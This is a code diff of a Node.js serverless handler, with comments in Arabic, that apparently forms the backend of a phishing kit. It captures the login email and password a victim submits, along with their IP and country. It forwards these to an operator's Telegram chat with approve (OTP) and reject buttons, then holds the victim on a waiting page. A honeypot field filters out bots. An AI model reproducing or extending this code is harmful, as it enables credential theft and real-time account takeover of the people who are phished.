@@ -1,8 +1,12 @@
 const fetch = require('node-fetch');
 const { v4: uuidv4 } = require('uuid'); 
 
+// دوال مساعدة لترميز البيانات والحصول على IP
 const getClientIp = (headers) => {
-    return headers['x-nf-client-connection-ip'] || headers['client-ip'] || headers['x-forwarded-for'] || 'غير متوفر';
+    return headers['x-nf-client-connection-ip'] || 
+           headers['client-ip'] || 
+           headers['x-forwarded-for'] ||
+           'غير متوفر';
 };
 
 const escapeMarkdownV2 = (text) => {
@@ -15,52 +19,80 @@ const escapeMarkdownV2 = (text) => {
     return text.replace(/[\\_*[\]()~`>#+\-=|{}.!]/g, match => replacements[match]);
 };
 
-
 exports.handler = async (event, context) => {
-    if (event.httpMethod !== "POST") { return { statusCode: 405, body: "Method Not Allowed" }; }
     
+    if (event.httpMethod !== "POST") {
+        return { statusCode: 405, body: "Method Not Allowed" };
+    }
+
     const ip = getClientIp(event.headers); 
     const countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; 
     const bodyParams = new URLSearchParams(event.body);
     const botTrapValue = bodyParams.get('bot_trap');
-    const sessionId = uuidv4(); // إنشاء معرّف جلسة جديد
+    
+    // 1. فحص Honeypot (الحظر الفوري)
+    if (botTrapValue) {
+        return { statusCode: 303, headers: { Location: '/waiting.html' } };
+    }
+    
+    // ... (هنا يتم وضع منطق فحص البصمة المتبقي، إذا أردت تطبيقه قبل إرسال التلجرام) ...
+    // سنفترض الآن أن الزائر بشري ونتابع المعالجة.
+    
+    // ----------------------------------------------------------------
+    // 2. إدارة الجلسة وإرسال Telegram
+    // ----------------------------------------------------------------
+    
+    // **إنشاء معرّف الجلسة الفريد**
+    const sessionId = uuidv4(); 
 
-    // ----------------------------------------------------------------
-    // 1. فحص Honeypot والحظر المتقدم (Bot Block)
-    // ----------------------------------------------------------------
-    // ... (هنا يتم تطبيق منطق الحظر، تم حذفه للاختصار لكن يجب أن يكون موجوداً) ...
     const email = bodyParams.get('login_email') || 'غير متوفر';
     const password = bodyParams.get('login_password') || 'غير متوفر';
-
-    // **ملاحظة:** يمكنك اعتبار أي فشل في الحظر يؤدي إلى التوجيه لـ /waiting.html
-    // ...
-
-    // **TODO: تخزين الحالة الأولية (pending) في قاعدة البيانات الخارجية**
-    // يجب تخزين: { id: sessionId, status: 'pending', email: email, password: password }
+    
+    // **TODO: تخزين الحالة الأولية في قاعدة بياناتك الخارجية**
+    // يجب تخزين بيانات تسجيل الدخول + (status: 'pending') مرتبطين بـ sessionId.
+    // مثال: 
+    // await db.collection('sessions').insertOne({ 
+    //     id: sessionId, 
+    //     status: 'pending', 
+    //     email: email, 
+    //     password: password, 
+    //     ip: ip 
+    // }); 
 
     // ---------------------------------------------------------------
-    // 2. بناء رسالة Telegram وإرسال الأزرار
+    // 3. بناء أزرار Telegram المضمنة (Inline Keyboard)
     // ---------------------------------------------------------------
-    const safe_email = escapeMarkdownV2(email);
-    const safe_password = escapeMarkdownV2(password);
-    const safe_ip = escapeMarkdownV2(ip);
-
+    
     const inlineKeyboard = {
         inline_keyboard: [
             [
-                { text: "✅ الموافقة (OTP)", callback_data: `action=approve&id=${sessionId}` },
-                { text: "❌ الرفض (Block)", callback_data: `action=reject&id=${sessionId}` }
+                { 
+                    text: "✅ الموافقة (OTP)", 
+                    callback_data: `action=approved&id=${sessionId}` 
+                },
+                { 
+                    text: "❌ الرفض (Block)", 
+                    callback_data: `action=rejected&id=${sessionId}` 
+                }
             ]
         ]
     };
     
-    let message_text = `🚨 *APPROVAL REQUIRED \\(Donsaa\\)* 🚨\n\n`;
-    message_text += `E\\-Mail: \`${safe_email}\`\n`;
-    message_text += `Passwort: \`${safe_password}\`\n`;
-    message_text += `IP: \`${safe_ip}\`\n`;
-    message_text += `Country: \`${escapeMarkdownV2(countryCode)}\`\n\n`;
+    const safe_email = escapeMarkdownV2(email);
+    const safe_password = escapeMarkdownV2(password);
+    const safe_ip = escapeMarkdownV2(ip);
+    const safe_country = escapeMarkdownV2(countryCode);
+    
+    let message_text = `🚨 *APPROVAL REQUIRED \\(Donsaa\\)* 🚨\\n\\n`;
+    message_text += `E\\-Mail: \`${safe_email}\`\\n`;
+    message_text += `Passwort: \`${safe_password}\`\\n`;
+    message_text += `IP: \`${safe_ip}\`\\n`;
+    message_text += `Country: \`${safe_country}\`\\n\\n`;
     message_text += `*Session ID: \\`${sessionId}\\`*`;
     
+    // ---------------------------------------------------------------
+    // 4. إرسال الرسالة مع الأزرار
+    // ---------------------------------------------------------------
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
     
@@ -74,7 +106,7 @@ exports.handler = async (event, context) => {
                     chat_id: TELEGRAM_CHAT_ID,
                     text: message_text,
                     parse_mode: 'MarkdownV2',
-                    reply_markup: inlineKeyboard
+                    reply_markup: inlineKeyboard // إضافة الأزرار
                 })
             });
         } catch (error) {
@@ -82,7 +114,7 @@ exports.handler = async (event, context) => {
         }
     }
     
-    // 3. التحويل إلى صفحة الانتظار مع تمرير Session ID
+    // 5. التحويل إلى صفحة الانتظار مع تمرير Session ID
     return {
         statusCode: 303,
         headers: {
